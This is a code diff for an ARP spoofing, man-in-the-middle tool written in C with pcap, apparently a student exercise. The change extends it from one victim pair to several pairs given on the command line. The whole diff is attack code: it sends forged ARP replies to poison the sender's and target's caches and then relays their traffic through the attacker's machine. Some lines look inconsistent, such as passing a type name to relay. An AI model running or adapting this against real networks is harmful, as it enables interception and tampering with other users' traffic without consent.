@@ -32,10 +32,13 @@ int main(int argc, char *argv[])
 	int rly_thr_id;
 	char *dev = argv[1];
 	char *result;
-	argv_ip(argv[2], sender_ip);
-	argv_ip(argv[3], target_ip);
 	my_mac(dev, attacker_mac);
 	s_getIpAddress(dev, attacker_ip);
+
+	int count = (argc - 2) / 2;
+	list *targets = (list *)malloc(sizeof(list) * count);
+	// argv_ip(argv[2], sender_ip);
+	// argv_ip(argv[3], target_ip);
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t *pcap = pcap_open_live(dev, 65536, 1, 1, errbuf);
 	if (pcap == nullptr)
@@ -44,44 +47,51 @@ int main(int argc, char *argv[])
 		return -1;
 	}
 
-	request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, target_ip, 0);
-	reply(dev, pcap, target_mac, target_ip);
-	request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, sender_ip, 0);
-	reply(dev, pcap, sender_mac, sender_ip);
+	for (int i = 0; i < count; i += 1)
+	{
+		argv_ip(argv[2 * i + 2], targets[i].sender_ip);
+		argv_ip(argv[2 * i + 3], targets[i].target_ip);
+		request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, targets[i].target_ip, 0);
+		reply(dev, pcap, targets[i].target_mac, targets[i].target_ip);
+		request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, targets[i].sender_ip, 0);
+		reply(dev, pcap, targets[i].sender_mac, targets[i].sender_ip);
+		printf("flow %d info\n", i);
+		printf("attacker ip addr : ");
+		print_ip(attacker_ip);
+		printf("sender ip addr : ");
+		print_ip(targets[i].sender_ip);
+		printf("target ip addr : ");
+		print_ip(targets[i].target_ip);
+		printf("attacker mac addr : ");
+		print_mac(attacker_mac);
+		printf("sender mac addr : ");
+		print_mac(targets[i].sender_mac);
+		printf("target mac addr : ");
+		print_mac(targets[i].target_mac);
+		printf("=============================\n\n");
+		request(dev, pcap, sender_mac, attacker_mac, attacker_mac, targets[i].target_ip, targets[i].sender_mac, targets[i].sender_ip, 1);
+		request(dev, pcap, target_mac, attacker_mac, attacker_mac, targets[i].sender_ip, targets[i].target_mac, targets[i].target_ip, 1);
+	}
 
 	// request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, target_ip, htons(ArpHdr::Request));
 	// reply(dev, pcap, target_mac, target_ip);
 	// request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, sender_ip, htons(ArpHdr::Request));
 	// reply(dev, pcap, sender_mac, sender_ip);
 
-	printf("attacker ip addr : ");
-	print_ip(attacker_ip);
-	printf("sender ip addr : ");
-	print_ip(sender_ip);
-	printf("target ip addr : ");
-	print_ip(target_ip);
-	printf("attacker mac addr : ");
-	print_mac(attacker_mac);
-	printf("sender mac addr : ");
-	print_mac(sender_mac);
-	printf("target mac addr : ");
-	print_mac(target_mac);
-
-	request(dev, pcap, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, 1);
-	request(dev, pcap, target_mac, attacker_mac, attacker_mac, sender_ip, target_mac, target_ip, 1);
 	// request(dev, pcap, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, htons(ArpHdr::Reply));
 	// request(dev, pcap, target_mac, attacker_mac, attacker_mac, sender_ip, target_mac, target_ip, htons(ArpHdr::Reply));
-	relay(dev, pcap, attacker_mac, sender_mac, target_mac, sender_ip, target_ip);
+	// relay(dev, pcap, attacker_mac, sender_mac, target_mac, sender_ip, target_ip);
+	relay(dev, pcap, attacker_mac, list, count);
 
-	// ArpInfo *arp_info;
-	// arp_info = (ArpInfo *)malloc(sizeof(ArpInfo));
-	// arp_info->dev = dev;
-	// arp_info->pcap = pcap;
-	// arp_info->attacker_mac = attacker_mac;
-	// arp_info->sender_mac = sender_mac;
-	// arp_info->target_mac = target_mac;
-	// arp_info->sender_ip = sender_ip;
-	// arp_info->target_ip = target_ip;
+	ArpInfo *arp_info;
+	arp_info = (ArpInfo *)malloc(sizeof(ArpInfo));
+	arp_info->dev = dev;
+	arp_info->pcap = pcap;
+	arp_info->attacker_mac = attacker_mac;
+	arp_info->sender_mac = sender_mac;
+	arp_info->target_mac = target_mac;
+	arp_info->sender_ip = sender_ip;
+	arp_info->target_ip = target_ip;
 
 	// rly_thr_id = pthread_create(&rly_thread, NULL, rly, (void *)arp_info);
 	// if (rly_thr_id < 0)
